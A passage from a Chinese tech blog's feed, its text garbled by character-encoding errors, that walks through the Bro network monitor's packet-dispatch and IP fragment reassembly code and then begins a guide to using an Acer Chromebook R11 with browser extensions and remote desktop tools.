&lt;h3 id="æ°æ®åå¤ççä¸»è¦å½æ°-net_run">æ°æ®åå¤ççä¸»è¦å½æ°ï¼ net_run()&lt;/h3>
&lt;blockquote>
&lt;p>net_run() (Net.cc)&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code class="language-cpp">void net_run()
{
set_processing_status(&amp;quot;RUNNING&amp;quot;, &amp;quot;net_run&amp;quot;);
while ( iosource_mgr-&amp;gt;Size() ||
(BifConst::exit_only_after_terminate &amp;amp;&amp;amp; ! terminating) )
{
double ts;
iosource::IOSource* src = iosource_mgr-&amp;gt;FindSoonest(&amp;amp;ts); //æå¼ä¹åï¼è·åæä»¥çç½å¡æèæä»¶çå¥æ
current_iosrc = src;
bool communication_enabled = using_communication;
if ( src ) //å¦æè¿ä¸ªå¥æä¸æ¯ç©ºçè¯å°±è¿å¥Process()å½æ°
src-&amp;gt;Process(); // which will call net_packet_dispatch()
else if ( reading_live &amp;amp;&amp;amp; ! pseudo_realtime)
{ // live but no source is currently active
double ct = current_time();
if ( ! net_is_processing_suspended() )
{
net_update_time(ct);
expire_timers();
usleep(1); // Just yield.
}
}
else if ( (have_pending_timers || communication_enabled) &amp;amp;&amp;amp;
! pseudo_realtime )
{
net_update_time(current_time());
expire_timers();
if ( ! communication_enabled )
usleep(100000);
else
usleep(1000);
mgr.Drain();
processing_start_time = 0.0; // = &amp;quot;we're not processing now&amp;quot;
current_dispatched = 0;
current_iosrc = 0;
extern void termination_signal();
if ( signal_val == SIGTERM || signal_val == SIGINT )
termination_signal();
if ( ! reading_traces )
have_pending_timers = timer_mgr-&amp;gt;Size() &amp;gt; 0;
}
net_get_final_stats();
}
&lt;/code>&lt;/pre>
&lt;p>è¿ä¸ªå½æ°å¹¶ä¸æ¯å¾é¿ï¼ä»ç»éè¯»ï¼æä»¬å¯ä»¥åç°æä»¬åªéè¦å³æ³¨å½æ°&lt;code>src-&amp;gt;Process&lt;/code>, å¶ä¸­&lt;code>src&lt;/code>æ¯&lt;code>iosource::IOSource* src = iosource_mgr-&amp;gt;FindSoonest(&amp;amp;ts);&lt;/code>ç¸å½äºå°±æ¯æå¼æä»¶æèç½å¡æ°æ®çå¥æï¼æä»¶å¥ææèç½å¡çå¥æï¼ãæä»¥å®çå¤çå½æ°ä¹å°±æ¯æä»¬æ³è¦çæ°æ®å¤çè¿ç¨äºã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-Bro_net_run.png" alt="2018-06-09-Bro_net_run">&lt;/p>
&lt;p>æ¥ä¸æ¥ç&lt;code>Process&lt;/code>å½æ°,å¨è¿ä¸ªå½æ°ä¸­æä»¬å¯ä»¥çå°å®å¤çäºPacketï¼å¤çå®ä¹åï¼è°ç¨äºä¸ä¸ª&lt;code>DoneWithPacket()&lt;/code>å½æ°ï¼ä½æä»¬éç¹æ¯å³æ³¨çå¤çè¿ç¨ï¼æä»¥æä»¬éè¦å³æ³¨å½æ°&lt;code>net_packet_dispatch(net_packet_dispatch(current_pseudo, &amp;amp;current_packet, this);)&lt;/code>,å¨è¿ä¸ªå½æ°ä¸­ä¼ å¥äºå½åæ°æ®åçæéã&lt;/p>
&lt;blockquote>
&lt;p>void Pktsrc::Process() (Pktsrc.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-src_process.png" alt="2018-06-09-src_process">&lt;/p>
&lt;p>æ¥ä¸æ¥éè¯»&lt;code>net_packet_dispatch(current_pseudo, &amp;amp;current_packet, this);&lt;/code>çå¤çè¿ç¨ãè¿ä¸ªå½æ°æ¯å¨&lt;code>net.cc&lt;/code>æä»¶ä¸­ï¼å&lt;code>net_run()&lt;/code>å½æ°æ¯å¨åä¸ä¸ªæä»¶ä¸­ã&lt;/p>
&lt;blockquote>
&lt;p>void net_packet_dispatch(double t, const Packet* pkt, iosource::PktSrc* src_ps) (net.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-net_packet_dispatch.png" alt="2018-06-09-net_packet_dispatch">&lt;/p>
&lt;p>å¨&lt;code>net_packet_dispatch()&lt;/code>å½æ°ä¸­ï¼æä¸ä¸ªç¹å«éè¦çæ°æ®ç»æ&lt;code>sessions&lt;/code>,è¿æ¯å¨&lt;code>sessions.cc&lt;/code>æä»¶ä¸­å®ä¹çä¸ä¸ªå¨å±åéã&lt;br>
&lt;code>NetSessions* sessions;&lt;/code>&lt;br>
å¨è¿éæä»¬éè¦éè¯»ä¸ä¸ç»æä½&lt;code>NetSessions&lt;/code>,è¿ä¸ªç»æä½æ¯å¨&lt;code>sessions.h&lt;/code>æä»¶ä¸­å®ä¹çãå¨è¿ä¸ªç»æä½ä¸­æä¸ä¸ªç¹å«éè¦çå½æ°&lt;code>NextPacket&lt;/code>,è¿ä¸ªå½æ°ä¹æ¯å¨&lt;code>net_packet_dispatch&lt;/code>ä¸­è¢«è°ç¨çæéè¦çå½æ°ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-NetSessions_class.png" alt="2018-06-09-NetSessions_class">&lt;/p>
&lt;p>æ¥ä¸æ¥éè¯»å³é®å½æ°ï¼&lt;code>NextPacket&lt;/code>&lt;/p>
&lt;blockquote>
&lt;p>void NetSessions::NextPacket(double t, const Packet* pkt) (sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code class="language-cpp">void NetSessions::NextPacket(double t, const Packet* pkt) //tå¯è½æ¯æ¶é´æ³
{
SegmentProfiler(segment_logger, &amp;quot;dispatching-packet&amp;quot;);
.....
if ( pkt-&amp;gt;hdr_size &amp;gt; pkt-&amp;gt;cap_len ) //å¼å§å¤æ­åçå¤§å°é®é¢
{
Weird(&amp;quot;truncated_link_frame&amp;quot;, pkt);
return;
}
uint32 caplen = pkt-&amp;gt;cap_len - pkt-&amp;gt;hdr_size;
//cap_lenæå°çæ°æ®åçå¤§å°ï¼ hdr_size --- IPå¤´éé¢çæ¾ç¤ºé¿åº¦
if ( pkt-&amp;gt;l3_proto == L3_IPV4 )
{
if ( caplen &amp;lt; sizeof(struct ip) )
{
Weird(&amp;quot;truncated_IP&amp;quot;, pkt);
return;
}
const struct ip* ip = (const struct ip*) (pkt-&amp;gt;data + pkt-&amp;gt;hdr_size);
IP_Hdr ip_hdr(ip, false);
DoNextPacket(t, pkt, &amp;amp;ip_hdr, 0);
}
else if ( pkt-&amp;gt;l3_proto == L3_IPV6 )
{
.....
DoNextPacket(t, pkt, &amp;amp;ip_hdr, 0);
}
else if ( pkt-&amp;gt;l3_proto == L3_ARP )
{
if ( arp_analyzer )
arp_analyzer-&amp;gt;NextPacket(t, pkt);
}
.......
if ( dump_this_packet &amp;amp;&amp;amp; ! record_all_packets )
DumpPacket(pkt);
}
&lt;/code>&lt;/pre>
&lt;p>ç»è¿åæï¼ä¸è¿°çä»£ç ä¸­ï¼æéè¦çæ¯å½æ°&lt;code>DoNextPacket(t, pkt, &amp;amp;ip_hdr, 0)&lt;/code>,ææ°æ®åä¼ å¥ï¼æåipå¤´çæéä¼ å¥ãè¿ä¸ªå½æ°å¯ä»¥è¯´æ¯æä»¬è¦æ¾çæéè¦çå½æ°äºï¼å¨è¿ä¸ªå½æ°ä¸­ï¼å®æäº&lt;code>IPå¤´&lt;/code>éç»å·¥ä½ã&lt;/p>
&lt;blockquote>
&lt;p>void NetSessions::DoNextPacket(double t, const Packet* pkt, const IP_Hdr* ip_hdr,
const EncapsulationStack* encapsulation) (Sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-DoNextPacket_Main.png" alt="2018-06-09-DoNextPacket_Main">
è¿ä¸ªå½æ°å·²ç»å¼å§å¤çIPæ°æ®åäº,å¨è¿ä¸ªå½æ°éé¢ï¼æä¸»è¦çé¨åæ¯å¤ççæ®µçé¨åå·¥ä½ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-DoNextPacket_fuction.png" alt="2018-06-09-DoNextPacket_fuction">&lt;/p>
&lt;p>ååå§å&lt;code>f&lt;/code>ä¹åï¼æ§è¡äºï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp"> if ( discarder &amp;amp;&amp;amp; discarder-&amp;gt;NextPacket(ip_hdr, len, caplen) )
return;
FragReassembler* f = 0;
if ( ip_hdr-&amp;gt;IsFragment() )
{
dump_this_packet = 1; // always record fragments
&lt;/code>&lt;/pre>
&lt;p>ä¸»è¦çä¸ä¸&lt;code>NextPacketå½æ°&lt;/code>çæ§è¡è¿ç¨:
å¨è¿ä¸ªå½æ°ä¸­ä¸»è¦æ£æ¥äºIPæ°æ®åï¼å¤æ­æ¯TCPè¿æ¯UDPï¼ç¶åå¤çIPåµå¥çæåµã&lt;/p>
&lt;pre>&lt;code class="language-cpp">
int Discarder::NextPacket(const IP_Hdr* ip, int len, int caplen)
{
int discard_packet = 0;
if ( check_ip )
{
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
try
{
discard_packet = check_ip-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
if ( discard_packet )
return discard_packet;
}
int proto = ip-&amp;gt;NextProto();
if ( proto != IPPROTO_TCP &amp;amp;&amp;amp; proto != IPPROTO_UDP &amp;amp;&amp;amp;
proto != IPPROTO_ICMP )
// This is not a protocol we understand.
return 0;
// XXX shall we only check the first packet???
if ( ip-&amp;gt;IsFragment() )
// Never check any fragment.
return 0;
int ip_hdr_len = ip-&amp;gt;HdrLen();
len -= ip_hdr_len; // remove IP header
caplen -= ip_hdr_len;
int is_tcp = (proto == IPPROTO_TCP);
int is_udp = (proto == IPPROTO_UDP);
int min_hdr_len = is_tcp ?
sizeof(struct tcphdr) :
(is_udp ? sizeof(struct udphdr) : sizeof(struct icmp));
if ( len &amp;lt; min_hdr_len || caplen &amp;lt; min_hdr_len )
// we don't have a complete protocol header
return 0;
// Where the data starts - if this is a protocol we know about,
// this gets advanced past the transport header.
const u_char* data = ip-&amp;gt;Payload();
if ( is_tcp )
{
if ( check_tcp )
{
const struct tcphdr* tp = (const struct tcphdr*) data;
int th_len = tp-&amp;gt;th_off * 4;
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
args-&amp;gt;append(BuildData(data, th_len, len, caplen));
try
{
discard_packet = check_tcp-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
}
}
else if ( is_udp )
{
if ( check_udp )
{
const struct udphdr* up = (const struct udphdr*) data;
int uh_len = sizeof (struct udphdr);
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
args-&amp;gt;append(BuildData(data, uh_len, len, caplen));
try
{
discard_packet = check_udp-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
}
}
else
{
if ( check_icmp )
{
const struct icmp* ih = (const struct icmp*) data;
val_list* args = new val_list;
args-&amp;gt;append(ip-&amp;gt;BuildPktHdrVal());
try
{
discard_packet = check_icmp-&amp;gt;Call(args)-&amp;gt;AsBool();
}
catch ( InterpreterException&amp;amp; e )
{
discard_packet = false;
}
delete args;
}
}
return discard_packet;
}
&lt;/code>&lt;/pre>
&lt;p>å¨è¿éä¸»è¦æ¯å³é®æ¯åä¸ªé¨å&lt;/p>
&lt;ul>
&lt;li>FragReassembler* f = 0; å®ä¹çæ®µéç»æ å¿ä½ä¸º0&lt;/li>
&lt;li>f = NextFragment(t, ip_hdr, pkt-&amp;gt;data + pkt-&amp;gt;hdr_size); å¾å°ä¸ä¸ä¸ªçæ®µçæé&lt;/li>
&lt;li>const IP_Hdr* ih = f-&amp;gt;ReassembledPkt();&lt;/li>
&lt;li>FragReassemblerTracker frt(this, f);&lt;/li>
&lt;/ul>
&lt;h3 id="è¯¦ç»åædonextpacketå½æ°çå¤çè¿ç¨">è¯¦ç»åæDoNextPacketå½æ°çå¤çè¿ç¨&lt;/h3>
&lt;h4 id="fragreassemblerç±»ç»æè§£æ">FragReassemblerç±»ç»æè§£æ&lt;/h4>
&lt;blockquote>
&lt;p>class FragReassembler (Frag.h)&lt;/p>
&lt;/blockquote>
&lt;p>éè¦çä¸ä¸&lt;code>FragReassembler&lt;/code>è¿ä¸ªç±»éé¢çæååéä»¥åç¸åºçå½æ°ãå¨è¿ä¸ªç±»å½ä¸­ï¼æéè¦çå½æ°æ¯&lt;code>ReassembledPkt&lt;/code>&lt;br>
&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-class-FragReassembler.png" alt="2018-06-09-class-FragReassembler">&lt;/p>
&lt;h4 id="nextfragmentå½æ°å¤çè¿ç¨">NextFragmentå½æ°å¤çè¿ç¨&lt;/h4>
&lt;blockquote>
&lt;p>FragReassembler* NetSessions::NextFragment(double t, const IP_Hdr* ip,
const u_char* pkt) (sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-FragReassembler-NextFragment.png" alt="2018-06-09-FragReassembler-NextFragment">&lt;/p>
&lt;p>å¨è¿ä¸ªå½æ°ä¸­ï¼ä¸»è¦æ¥æ¾äºfragmentï¼å¦ææ²¡æä¸ä¸ä¸ªï¼å°±æ°å»ºä¸ä¸ªæ°çFragmentå¹¶æ·»å å°&lt;code>fragments&lt;/code>çç»æä½éé¢å»ã&lt;/p>
&lt;h4 id="reassembledpktå½æ°å¤çè¿ç¨">ReassembledPktå½æ°å¤çè¿ç¨&lt;/h4>
&lt;p>è¿ä¸ªå½æ°çå¤çè¿ç¨åªæä¸æ¡ã&lt;/p>
&lt;blockquote>
&lt;p>ReassembledPkt() (Frag.h)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code> const IP_Hdr* ReassembledPkt() { return reassembled_pkt; }&lt;/code>&lt;/p>
&lt;p>å¯¹åºç&lt;code>IP_Hdr* reassembled_pkt;&lt;/code>,æä»¥åªæ¯è¿åå»äºä¸ä¸ªæéå¤´&lt;/p>
&lt;h4 id="fragreassemblertracker-frtthis-få¤çè¿ç¨">FragReassemblerTracker frt(this, f)å¤çè¿ç¨&lt;/h4>
&lt;h4 id="å¤çconnçè¿ç¨">å¤çConnçè¿ç¨&lt;/h4>
&lt;p>å¨&lt;code>DoNextPacket&lt;/code>è¿ä¸ªå½æ°çæåï¼ä¼å»æ°å»ºæèæ¾å°ä¸ä¸ª&lt;code>Conn&lt;/code>å¤çå¤çæ°æ®åãæ§è¡ä»£ç :&lt;/p>
&lt;blockquote>
&lt;p>DoNextPacket() (Sessions.cc)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-06-09-DoNextPacket-new-conn.png" alt="2018-06-09-DoNextPacket-new-conn">&lt;/p>
&lt;p>å¨å¤çConnè¿ä¸ªé¨åçæ¶åï¼æ£æ¥æ¯å¦æå¯¹åºç&lt;code>connection&lt;/code>,æ ¹æ®hashå¼å»æ¥è¯¢&lt;code>HashKey* h = BuildConnIDHashKey(id);&lt;/code>,å¦ææ²¡æå¯¹åºç&lt;code>Conn&lt;/code>ï¼é£ä¹å°±å»æ°å»ºä¸ä¸ªï¼æ°å»ºå®ä¹åï¼æå¥å°connectçé¾è¡¨ä¸­ãå¦æå·²ç»æäºå¯¹åºç&lt;code>Conn&lt;/code>é£å°±éè¦å¤æ­å½åç&lt;code>conn&lt;/code>æ¯ä¸æ¯ä¸æ­£ç¡®çæ°æ®ä»¥åææ²¡æè¢«å¤ç¨ãå¦ææçè¯ï¼å é¤å¯¹åºç&lt;code>conn&lt;/code>çHashå¼ã&lt;/p></description></item><item><title>Acer Chromebook R11 ChromeOS ä½¿ç¨æå(å)</title><link>http://www.guozet.me/post/Acer-Chromebook-R11/</link><pubDate>Wed, 30 May 2018 20:30:32 +0000</pubDate><guid>http://www.guozet.me/post/Acer-Chromebook-R11/</guid><description>&lt;h2 id="åè¨">åè¨&lt;/h2>
&lt;p>ä¹åä½¿ç¨äºä¸¤å¹´çMSI GE60 2PG ç¬è®°æ¬æ£ç­é®é¢è¶æ¥è¶ä¸¥éï¼å¯¼è´é£ææ°¸è¿è½¬å°æé«è½¬éï¼å¦åCPUæ¸©åº¦ä¸ç´æ æ³éä¸æ¥ãä½æ¯ï¼é£æè½¬å°æé«è½¬éï¼è¿å°çµèäº§ççåªé³ä¼éå¸¸å¤§ï¼å¦æåå¾ä¹¦é¦æèå®éªå®¤ä½¿ç¨ï¼å¾å®¹æå°±å½±åå°å¨å´å­¦ä¹ çå¶ä»åå­¦äºï¼äºæ¯èèå°é½ä¹°å¦å¤ä¸ä¸ªè½»ä¾¿çï¼å¾æºæ¶é´æ¯è¾é¿çç¬è®°æ¬å°å­¦æ ¡ï¼è½å¤æ¯æèªå·±çå¸¸è§ä½¿ç¨ã&lt;/p>
&lt;h2 id="è´­ä¹°-acer-chromebook-r11">è´­ä¹° Acer Chromebook R11&lt;/h2>
&lt;p>ç»¼åå¯¹æ¯çèªå·±çé¢ç®ä»¥åç½åçè¯ä»·ï¼æåéæ©äº
&lt;a href="https://www.acer.com/ac/en/US/content/series/acerchromebookr11" target="_blank" rel="noopener">Acer Chromebook R11&lt;/a>(åå­4G, SSD:32G), ä¸»è¦èèçæ¯åªéè¦279åï¼å¾æºæ¶é´å°10å°æ¶å·¦å³ï¼å±å¹è§¦å±ï¼ç»é¢æ¾ç¤ºç»åï¼è§¦æ¸æ¿é®çæ¯è¾èæã
ä¸ªäººä½¿ç¨Chromebookçç®æ æ¯æ¯ï¼&lt;/p>
&lt;ul>
&lt;li>éè¯»ç½é¡µï¼PDFææ¡£ï¼ä½¿ç¨Google docä¹¦åææ¡£&lt;/li>
&lt;li>ç®åä½¿ç¨SSHç»éå°æå¡å¨ä¹¦åä»£ç &lt;/li>
&lt;li>ä»£ç éè¯»ï¼ç®åç¼è¯ä¸äºç»ä¹ ä»£ç &lt;/li>
&lt;li>è¿ç¨è¿æ¥MSI GE60 çµèå®æå¼åæå¤çç´§æ¥é®é¢
æå¹¶ä¸æ³ä½¿ç¨ä¸å°279åçChromebookæ¥å®æèªå·±çé¡¹ç®å¼åæèè¿è¡Matlabä¹ç±»çè½¯ä»¶ï¼å®çå®ä½å°±æ¯è¾å©èªå·±å®æä¸äºç®åçä¸éè¦æ¶èå¤ªå¤§åå­èµæºçå·¥ä½ï¼åç»­æå¯¹Acer Chromebookçä½¿ç¨è¿ç¨ä¸­ä¹æ¯è¿æ ·å»å®æçã&lt;/li>
&lt;/ul>
&lt;h2 id="ä½¿ç¨æå">ä½¿ç¨æå&lt;/h2>
&lt;h3 id="å¸¸ç¨åè½æä»¶">å¸¸ç¨åè½&amp;amp;æä»¶&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>
&lt;a href="https://www.kamihq.com/" target="_blank" rel="noopener">Kami&lt;/a> ï¼ è¿å¹¶ä¸è½ç®ä½æ¯ä¸ä¸ªæä»¶ï¼è¿æ¯ä¸ä¸ªå¨çº¿çPDFéè¯»æ æ³¨ç½ç«ï¼ä½ å¯ä»¥ç»å®Googleé®ç®±ï¼ä¸ä¼ èªå·±æ¬å°çæä»¶ï¼ç¶åå¨çº¿éè¯»å¹¶åç¬è®°ï¼ç¶åå®ä¼èªå¨æä½ çç¬è®°ä»¥åææ¡£ä¿å­å°Googleäºçéé¢ï¼ååæ¹ä¾¿ï¼éæ¶å¨ä½å°é½å¯ä»¥éè¿æµè§å¨æ¥æå¼ä½¿ç¨ï¼ä¸æ ·çç¬è®°ï¼ä¸æ ·çéè¯»è¿åº¦ï¼å¾éåä½ä¸ºäºç«¯çPDFéè¯»å·¥å·ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://stackedit.io/app#" target="_blank" rel="noopener">stackedit&lt;/a>: ç½é¡µåºç¨ï¼è¿æ¯å¼æºä¸ççmarkdownå©å¨ï¼è®©ä½ éæ¶éå°åç¬è®°ãåè®°å½ãå¦æä½ åæ¬¢ååå®¢ï¼æèåæ¬¢Markdownè¿ç§ä¸æ³¨äºåä½çæ¹å¼ï¼å¼ºçæ¨èå°è¯ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/evernote-web-clipper/pioclpoplcdbaefihamjohnefbikjilc?hl=en-US" target="_blank" rel="noopener">Evernote Web&lt;/a> : è¿æ¯chromeç«¯çEvernoteç¬è®°çæ¶éæä»¶ï¼è½å¤å¿«éçæç½é¡µèµææ¶éå°èªå·±çEvernoteéé¢å»ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/desktop-messenger-for-tel/dafiggkhlbbhfcpgggcfeeoliillkabn?hl=en-US" target="_blank" rel="noopener">Telegram&lt;/a> : è¿æ¯ä¸æ¬¾å å¯çéä¿¡è½¯ä»¶ï¼å¯ä»¥å¾å¥½çå¨ææºç«¯åçµèç«¯åæ­¥æ¶æ¯ï¼äºä¼ æä»¶(å¤§å°æ²¡æéå¶)ï¼å¹¶ä¸æ¶æ¯åæä»¶æ°¸ä¹ä¿å­ï¼å¹¶ä¸ä¼å ä¸ºä½ æ¢æ¶éæèçµèèå¯¼è´ä½ çæ¶æ¯åæä»¶ä¸¢å¤±ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/gmail-offline/ejidjjhkpiempkbhmpbfngldlkglhimk?hl=en" target="_blank" rel="noopener">Gmail Ofline&lt;/a>: è¿æ¯æ²¡æåæ³çæ¶åï¼æ»æ¯æå¨å´æ²¡ææ çº¿çå°æ¹ï¼æä»¥ä½ å°±éè¦ä¸ä¸ªç¦»çº¿çGmailï¼è®©èªå·±è½å¤ç¦»çº¿ç¼è¾ä¸äºé®ä»¶æ¶æ¯ï¼å½Chromebookè¿æ¥å°ç½ç»çæ¶åï¼è½å¤å¿«éåéé®ä»¶åºå»ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/chrome-remote-desktop/gbchcmhmhahfdphkhkmpfmihenigjmpp?hl=en" target="_blank" rel="noopener">Chrome Remote Desktop&lt;/a> ä½æä»¬çèµæå¨å®¶éççµèä¸ï¼æèå¨å¬å¸ççµèä¸é¢æ¶ï¼æä»¬éè¦ç­æçè¿æ¥è¿å»ï¼å¤çä¸äºå·¥ä½çæ¶åï¼è¿ä¸ªæä»¶å°±è½å¤å¾å¥½çå¸®å©ä½ å¿«éçå®æä»»å¡ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/caret/fljalecfjciodhpcledpamjachpmelml?hl=en" target="_blank" rel="noopener">Caret&lt;/a>: Chromebookç«¯çä»£ç éè¯»å·¥å·ï¼å¯¹ä¸­ææ¯ææ¯è¾åå¥½ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/mathstudio/pcpedkecdcnobiheblbhgleenlbdoknp?hl=en-US" target="_blank" rel="noopener">MathStudio&lt;/a>: å¾å°ä½æ¯åè½å¾å¼ºå¤§çæ°å­¦å·¥å·ï¼è½å¤ç»åºç®åçæ­£å¼¦å¾å½¢ï¼ä»¥åä¸äºå¸¸ç¨çæ°å­¦å¾å½¢ï¼å½ç¶ä¹å¯ä»¥ä½ä¸ºæ°å­¦è®¡ç®å¨æ¥ä½¿ç¨ï¼å¾æ¹ä¾¿ã&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/pdf-merge-pdf-files-merge/ndolbcaghkmhjhgggldkgjibdilpbdbm?hl=en-US" target="_blank" rel="noopener">PDF Mergy&lt;/a>: å°æä»¶ï¼å®æPDFæä»¶çåå¹¶å·¥ä½&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Write: ä¹¦åå°æä»¶ï¼è½å¤æå¼ä¸ä¸ªå¾ç»ä¸½çç½é¡µï¼è®©ä½ ä¸æ³¨çä¹¦ååå®¹&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://github.com/listen1/listen1_chrome_extension" target="_blank" rel="noopener">listen1_chrome_extension&lt;/a> å¬æ­å©å¨ï¼å¨ Chromebook éæ´æ¯ç¥å¨ï¼ä¸ç¨å®è£ä¸å¼å®¹ç Android apps&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=en-US" target="_blank" rel="noopener">Tampermonkey&lt;/a> å ublock è¿ç§ç¥å¨å°±ä¸ä»ç»äº&lt;/p>
&lt;/li>
&lt;li>
&lt;p>
&lt;a href="https://chrome.google.com/webstore/detail/cog-system-info-viewer/difcjdggkffcfgcfconafogflmmaadco?utm_source=chrome-app-launcher-info-dialog" target="_blank" rel="noopener">Cog - System Info Viewer&lt;/a> æ¥çæ§è½çå·¥å·&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>è¿äºæä»¶æ¯æä½¿ç¨è¿ä¸æ®µæ¶é´ä¹åï¼ä¾æ§è¿ä¿çå¨æçChromebookä¸é¢çåå®¹ï¼å¦æä½ æå´è¶£ï¼ä¸å¦¨å°è¯ä¸ä¸ã&lt;/p>
&lt;h3 id="è¿é¶æä½è¿ç¨æ¡é¢">è¿é¶æä½ï¼è¿ç¨æ¡é¢&lt;/h3>
&lt;h4 id="åºæ¯">åºæ¯&lt;/h4>
&lt;p>é¿æ¶é´ä½¿ç¨Chromebookè¿æ¥å°å¬å¸æèå®¶éèªå·±çä¸»æºè¿è¡å·¥ä½ï¼å®æé¡¹ç®ç­ï¼è¿å°±éè¦èèä½¿ç¨è¿ç¨æ¡é¢æ¥å¾å¥½çå®æå·¥ä½ãç»è¿ä¸ä¸ªæçæ¶é´ï¼éç»­å°å°è¯äºè½å¤æ¯æChromebookçè¿ç¨æ¡é¢è½¯ä»¶ã
ä¸ªäººè¦æ±ï¼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>éè¿Chromebookçchromeæä»¶æèAppè½å¤è¿è¡è¿ç¨è¿æ¥(å¹¶ä¸æ¯éè¿å®åAPP)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä½¿ç¨è¿ç¨ä¸­ä¸éè¿IPå°åç´æ¥è¿æ¥(å°è¯è¿è¿ç§æ¹å¼ï¼ä½æ¯å¹¶ä¸è½è¾¾å°æçç»è´¨è¦æ±)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>é¿æ¶é´(è¶è¿10å°æ¶)è¿æ¥ä½¿ç¨æ¯è¾ç¨³å®&lt;/p>
&lt;/li>
&lt;li>
&lt;p>æä½æ¹ä¾¿ï¼Chromebookçæé®è½å¤æ­£å¸¸å·¥ä½&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ç»è¿å¯¹æ¯Teamviewer, Splashtop, Chrome Remote Desktop app, UltraVNCè¿å æ¬¾è½å¤å¨Chromebookä¸é¢ä½¿ç¨çæä»¶æèAPPï¼å»æäºæ¶è´¹çSplashtopï¼ä»¥åéè¦IPå°åç¹å¯¹ç¹è¿æ¥çUltraVNCï¼æåä¿çäºTeamvieweråChrome Remote Desktop.&lt;/p>
&lt;h4 id="teamviewer">Teamviewer&lt;/h4>
&lt;p>Teamviewerå¨chromebookä¸è¿æ¥Win10çç»é¢ææï¼å»¶æ¶æåµåºè¯¥æ¯ä¸è¿°è½¯ä»¶éé¢æå¥½çäºï¼å¹¶ä¸é¢åä¸ªäººä½¿ç¨æ¯å®å¨åè´¹çï¼ä½ åªéè¦ç»å½ä½ çè´¦å·ï¼å°±å¯ä»¥åè´¹æ å¹¿åçè¿æ¥èªå·±çè¿ç¨ä¸»æºï¼å¹¶ä¸éè¦èèIPå°åï¼é²ç«å¢ä»¥åNATä»£çä¹ç±»çãä½ä¹æè¿ä¹å ä¸ªç¼ºç¹ã&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Chromebookç«¯çè½¯ä»¶åè½ä¸å®åï¼å¿é¡»æ¯æ¬¡ç»å½å°ç½é¡µç«¯æè½å¤çå°èªå·±è´¦å·ä¸é¢çæºå¨ï¼éè¿å¨ç½é¡µç«¯ç¹å»ç¶åè°ç¨APPè¿æ¥ï¼è¿ç¨æ¯è¾ç¹ç&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¯¹Chromebookçé®çæ²¡æééï¼å¯¼è´æä½èµ·æ¥å¹¶ä¸æ¯å¾æ¹ä¾¿ãæ¯å¦ï¼ä¸è½ä½¿ç¨&lt;code>Windows&lt;/code>æé®&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="chrome-remote-desktop">Chrome Remote Desktop&lt;/h4>
&lt;p>è°·æ­èªå·±çè¿ç¨æ¡é¢è½¯ä»¶ï¼æä»¥å¯¹Chromebookçæ¯ææ¯è¾å¥½ï¼æChromebookå³ä¾§ç&lt;code>Ctrl&lt;/code>æé®è½¬æ¢ä¸ºäº&lt;code>Windows&lt;/code>æé®ï¼ä»¥åå¾å¤çChromebookå¿«æ·é®ä¹å¯ä»¥å¨è¿ç¨æ¡é¢çæ¶åä½¿ç¨ãåæ¬¡ä¹å¤ï¼åTeamviewerå¯¹æ¯èµ·æ¥æè¿ä¹å ä¸ªç¼ºç¹ï¼&lt;/p>
&lt;ul>
&lt;li>
